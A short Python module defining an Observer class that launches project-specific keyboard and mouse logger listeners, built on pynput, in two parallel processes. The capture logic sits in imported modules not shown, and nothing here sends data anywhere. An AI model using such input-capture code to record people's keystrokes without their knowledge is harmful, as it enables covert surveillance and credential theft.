import multiprocessing

from pynput.keyboard import Listener as KeyListener
from pynput.mouse import Listener as MouseListener

from Loggers.KeyLogger import KeyLogger
from Loggers.MouseLogger import MouseLogger

class Observer():
    
    def __init__(self):
        pass
    
    def activate_listeners(self):
        mouse_logger = MouseLogger()
        key_logger = KeyLogger()
        
        process_mouse = multiprocessing.Process(target=mouse_logger.mouse_listener)
        process_key = multiprocessing.Process(target=key_logger.keyboard_listener)
        
        process_mouse.start()
        process_key.start()
        
        process_mouse.join()
        process_key.join()